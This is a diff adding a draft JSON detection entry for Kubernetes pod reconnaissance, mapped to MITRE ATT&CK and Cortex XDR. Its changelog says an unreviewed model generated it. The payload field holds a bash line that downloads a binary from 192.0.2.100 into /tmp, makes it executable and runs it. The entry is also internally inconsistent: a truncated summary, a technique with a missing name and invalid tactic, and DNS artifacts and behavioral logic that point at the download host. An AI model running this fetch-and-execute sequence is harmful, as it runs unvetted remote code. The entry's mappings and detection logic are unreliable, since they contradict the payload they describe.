@@ -1,0 +1,186 @@
+{
+  "id": "TTP-0000-0319",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Kubernetes Pod Reconnaissance for Container Enumeration",
+    "summary": "An attacker inside a Kubernetes pod executes commands to enumerate container and node information, which triggers the Cortex analytics for suspicious container reconnaissance activity. The behavior is",
+    "description": "An attacker inside a Kubernetes pod executes commands to enumerate container and node information, which triggers the Cortex analytics for suspicious container reconnaissance activity. The behavior is detected by analyzing process execution and network connections."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1069",
+        "subtechnique_id": "T1069.001",
+        "name": "T1069.001",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1082",
+        "name": "System Information Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/kube-info https://192.0.2.100/pod-info\nchmod 755 /tmp/kube-info\n/tmp/kube-info\nsleep 5\nnslookup kubernetes.default.svc.cluster.local\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of kube-info binary",
+        "expected_value": "action_process_image_name = '/tmp/kube-info'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "DNS lookup to Kubernetes service",
+        "expected_value": "action_remote_ip = '192.0.2.100'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Suspicious K8s Pod Reconnaissance Process",
+        "description": "Execution of a binary that queries Kubernetes pod and node metadata",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/kube-info'\n| filter causality_actor_process_image_name = 'sh'",
+        "mitre_technique_ids": [
+          "T1059.004",
+          "T1069.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Container Reconnaissance Behavioral Pattern",
+        "description": "Behavioral deviation of process execution followed by DNS resolution to Kubernetes service endpoints",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/kube-info'\n| filter causality_actor_process_image_name = 'sh'\n| join with dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.100'\n| filter dst_port = 53",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start /tmp/kube-info",
+        "mitre_technique_ids": [
+          "T1059.004",
+          "T1069.001",
+          "T1082"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "K8s Reconnaissance Process Chain",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = '/tmp/kube-info'\n| filter causality_actor_process_image_name = 'sh'\n| fields actor_process_image_name, action_process_image_name, causality_actor_process_image_name",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Suspicious container reconnaissance activity in a Kubernetes pod; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/suspicious-container-reconnaissance-activity-in-a-kubernetes-pod"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Suspicious container reconnaissance activity in a Kubernetes pod",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/suspicious-container-reconnaissance-activity-in-a-kubernetes-pod",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.004",
+      "url": "https://attack.mitre.org/techniques/T1059/004/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1069.001",
+      "url": "https://attack.mitre.org/techniques/T1069/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1082",
+      "url": "https://attack.mitre.org/techniques/T1082/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
